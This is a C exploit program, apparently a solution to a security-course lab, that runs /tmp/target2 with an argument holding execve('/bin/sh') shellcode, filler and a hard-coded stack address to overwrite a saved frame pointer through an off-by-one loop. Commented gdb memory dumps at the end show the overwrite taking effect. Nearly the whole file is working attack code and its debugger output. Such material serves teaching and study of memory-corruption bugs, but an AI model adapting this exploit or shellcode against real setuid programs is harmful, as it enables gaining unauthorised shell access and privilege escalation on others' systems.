#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh"
"\xff\xff\xff"
"\xab\xcd\xab\xcd\x11\x11\x11\x11\xff\xff\xff\xff"
"\xc8\xfd\xff\xbf\xee\xee\xee\xee\xff\xff\xff\xff"
"\x11\x11\x11\x11\x11\x11\x11\x11\x00";
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
//0xbffffdc8
// (gdb) x/60 0xbffffdc8
// 0xbffffdc8:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
// 0xbffffdd8:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
// 0xbffffde8:	0xffdce880	0x622fffff	0x732f6e69	0xffffff68
// 0xbffffdf8:	0xcdabcdab	0x11111111	0xffffffff	0xbffffdc8
// 0xbffffe08:	0xeeeeeeee	0xffffffff	0x11111111	0x11111111
// 0xbffffe18:	0xbffffe28	0x080484b3	0xbfffff9e	0x08049700
// 0xbffffe28:	0xbffffe48	0x08048515	0xbfffff9e	0x08049700
// 0xbffffe38:	0xbffffe58	0x08048559	0xbffffe60	0xbffffe60
// 0xbffffe48:	0xbffffeb8	0xb7e98455	0x08048540	0x08048380
// 0xbffffe58:	0xbffffeb8	0xb7e98455	0x00000002	0xbffffee4
// 0xbffffe68:	0xbffffef0	0xb7fe2b38	0x00000001	0x00000001
// 0xbffffe78:	0x00000000	0x08048263	0xb7fd8ff4	0x08048540
// 0xbffffe88:	0x08048380	0xbffffeb8	0xebfcc081	0xc7083491
// 0xbffffe98:	0x00000000	0x00000000	0x00000000	0xb7ff7200
// 0xbffffea8:	0xb7e9837d	0xb7ffeff4	0x00000002	0x08048380
// (gdb) s 1
// 13	  for (i = 0; i <= len; i++)
// (gdb) x/60 0xbffffdc8
// 0xbffffdc8:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
// 0xbffffdd8:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
// 0xbffffde8:	0xffdce880	0x622fffff	0x732f6e69	0xffffff68
// 0xbffffdf8:	0xcdabcdab	0x11111111	0xffffffff	0xbffffdc8
// 0xbffffe08:	0xeeeeeeee	0xffffffff	0x11111111	0x11111111
// 0xbffffe18:	0xbffffe00	0x080484b3	0xbfffff9e	0x08049700
// 0xbffffe28:	0xbffffe48	0x08048515	0xbfffff9e	0x08049700
// 0xbffffe38:	0xbffffe58	0x08048559	0xbffffe60	0xbffffe60
// 0xbffffe48:	0xbffffeb8	0xb7e98455	0x08048540	0x08048380
// 0xbffffe58:	0xbffffeb8	0xb7e98455	0x00000002	0xbffffee4
// 0xbffffe68:	0xbffffef0	0xb7fe2b38	0x00000001	0x00000001
// 0xbffffe78:	0x00000000	0x08048263	0xb7fd8ff4	0x08048540
// 0xbffffe88:	0x08048380	0xbffffeb8	0xebfcc081	0xc7083491
// 0xbffffe98:	0x00000000	0x00000000	0x00000000	0xb7ff7200
// 0xbffffea8:	0xb7e9837d	0xb7ffeff4	0x00000002	0x08048380
// (gdb)